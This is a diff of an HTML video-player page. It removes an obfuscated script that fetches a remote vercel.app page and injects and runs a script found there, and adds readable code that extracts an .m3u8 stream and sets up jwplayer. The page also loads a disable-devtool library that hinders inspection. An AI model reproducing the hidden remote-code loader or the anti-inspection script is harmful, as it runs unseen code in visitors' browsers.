@@ -30,8 +30,71 @@
   <div id="player"></div>
 
   <script>
-const _0x13757f=_0x2a50;(function(_0x57e19d,_0x4edfd4){const _0x1d3903=_0x2a50,_0x56d71e=_0x57e19d();while(!![]){try{const _0x559950=-parseInt(_0x1d3903(0x145))/(0x186a+-0xd1*0x2+-0x11*0x157)+-parseInt(_0x1d3903(0x146))/(0xc85+0x1370+-0x1ff3)*(-parseInt(_0x1d3903(0x147))/(0xc91*0x1+-0x3eb+-0xc9*0xb))+-parseInt(_0x1d3903(0x13f))/(-0x1*-0x61+-0x21de+0x2181)+parseInt(_0x1d3903(0x14c))/(-0x1*-0x11b+0x1cd*-0xf+0x19ed)+-parseInt(_0x1d3903(0x15e))/(-0xba*-0xc+0x1*-0x1e2f+0x157d)*(parseInt(_0x1d3903(0x14a))/(-0xd0d+0x1a81+-0xd6d))+parseInt(_0x1d3903(0x15d))/(0xb64+0x9c7*0x1+-0x1523)*(parseInt(_0x1d3903(0x154))/(-0x22f1*-0x1+0x1e66+-0x2*0x20a7))+parseInt(_0x1d3903(0x140))/(0x2*0x397+0x2*0xceb+-0x20fa);if(_0x559950===_0x4edfd4)break;else _0x56d71e['push'](_0x56d71e['shift']());}catch(_0x20922d){_0x56d71e['push'](_0x56d71e['shift']());}}}(_0x1cde,0x2*0x19052+-0x39667+-0x9*-0x135f9));function _0x2a50(_0x10a952,_0x480683){const _0x36eec8=_0x1cde();return _0x2a50=function(_0x5ab9d1,_0x10c8d3){_0x5ab9d1=_0x5ab9d1-(0x1be3+-0x490+0x1614*-0x1);let _0x38b794=_0x36eec8[_0x5ab9d1];return _0x38b794;},_0x2a50(_0x10a952,_0x480683);}const videoId=new URLSearchParams(window[_0x13757f(0x160)][_0x13757f(0x142)])[_0x13757f(0x150)]('id');videoId&&((async()=>{const _0x39ddcc=_0x13757f,_0x29f080={'YEhfM':function(_0x2f5e10,_0xddad1a){return _0x2f5e10(_0xddad1a);},'QMNiC':_0x39ddcc(0x152),'pxyfY':_0x39ddcc(0x141),'ipSVv':_0x39ddcc(0x164)};try{const _0x5beb54=await _0x29f080[_0x39ddcc(0x162)](fetch,_0x39ddcc(0x153)+_0x39ddcc(0x14f)+_0x39ddcc(0x15a)+'/'+videoId);if(_0x5beb54['ok']){const _0xf45baa=await _0x5beb54[_0x39ddcc(0x144)](),_0xdb15ad=new DOMParser(),_0x30c21f=_0xdb15ad[_0x39ddcc(0x151)+_0x39ddcc(0x148)](_0xf45baa,_0x29f080[_0x39ddcc(0x14b)]),_0x17f423=Array[_0x39ddcc(0x157)](_0x30c21f[_0x39ddcc(0x143)+_0x39ddcc(0x159)](_0x29f080[_0x39ddcc(0x155)]))[_0x39ddcc(0x15c)](_0x109ed8=>_0x109ed8[_0x39ddcc(0x156)+'t'][_0x39ddcc(0x166)](_0x39ddcc(0x14e)+_0x39ddcc(0x161)));if(_0x17f423){const _0x1b3ed6=_0x17f423[_0x39ddcc(0x156)+'t'],_0x13440f=document[_0x39ddcc(0x163)+_0x39ddcc(0x14d)](_0x29f080[_0x39ddcc(0x155)]);_0x13440f[_0x39ddcc(0x156)+'t']=_0x1b3ed6,document[_0x39ddcc(0x158)][_0x39ddcc(0x15b)+'d'](_0x13440f);}else console[_0x39ddcc(0x165)](_0x29f080[_0x39ddcc(0x15f)]);}else console[_0x39ddcc(0x165)](_0x29f080[_0x39ddcc(0x15f)],_0x5beb54[_0x39ddcc(0x149)]);}catch(_0x66a1a9){console[_0x39ddcc(0x165)](_0x29f080[_0x39ddcc(0x15f)],_0x66a1a9);}})());function _0x1cde(){const _0x10759f=['torAll','vercel.app','appendChil','find','8DeIdOU','12rksWDN','ipSVv','location','1\x20=','YEhfM','createElem','Erro','error','includes','3378892kOgxjc','22897520kvLLhN','script','search','querySelec','text','1248813VwahxM','3716RMCjKb','627JfLVxS','tring','status','4187918QTbXTq','QMNiC','5597025qqgCHh','ent','var\x20_0xabc','nsoledbtv.','get','parseFromS','text/html','https://co','1589715OPeYQT','pxyfY','textConten','from','body'];_0x1cde=function(){return _0x10759f;};return _0x1cde();}
-  </script>
+// Função para obter o parâmetro da URL com base no nome fornecido
+function getParametroUrl(parametro) {
+  const parametrosUrl = new URLSearchParams(window.location.search);
+  return parametrosUrl.get(parametro);
+}
+
+// Função assíncrona para configurar o player de vídeo
+async function configurarPlayer(codigoBase64) {
+  try {
+    // Decodifica o código base64
+    const urlDecodificada = atob(codigoBase64);
+    // Constrói a URL completa para obter o stream
+    const urlStream = "https://consoledplay.vercel.app/" + encodeURIComponent(urlDecodificada);
+    
+    // Faz uma requisição para obter o conteúdo da URL
+    const resposta = await fetch(urlStream);
+    const conteudo = await resposta.text();
+    
+    // Expressão regular para encontrar o link .m3u8 no conteúdo
+    const expressaoRegular = /https:\/\/[^"]+\.m3u8/i;
+    const urlM3u8 = conteudo.match(expressaoRegular);
+    
+    // Se encontrar a URL do stream, configura o player
+    if (urlM3u8) {
+      const urlStreamM3u8 = urlM3u8[0];
+
+      // Aqui, extrai o arquivo e configura o player
+      var playerInstance = jwplayer("player");
+      playerInstance.setup({
+        playlist: [{
+          "sources": [
+            {
+              "default": false,
+              "type": "hls",
+              "file": urlStreamM3u8, // Aqui é onde o link .m3u8 extraído é usado
+              "label": "0"
+            }
+          ]
+        }],
+        width: "100%",
+        height: "100%",
+        aspectratio: "16:9",
+        autostart: false,
+        cast: {},
+        sharing: false
+      });
+    } else {
+      console.error("URL do stream não encontrada na página.");
+    }
+  } catch (erro) {
+    console.error("Erro ao configurar o player:", erro);
+  }
+}
+
+// Evento que é disparado quando o conteúdo da página é totalmente carregado
+document.addEventListener("DOMContentLoaded", function () {
+  // Obtém o parâmetro 'id' da URL
+  const parametroId = getParametroUrl('id');
+  
+  // Se o parâmetro 'id' for encontrado, configura o player com o valor do parâmetro
+  if (parametroId) {
+    configurarPlayer(parametroId);
+  }
+});
+ </script>
   
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
 <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script> 
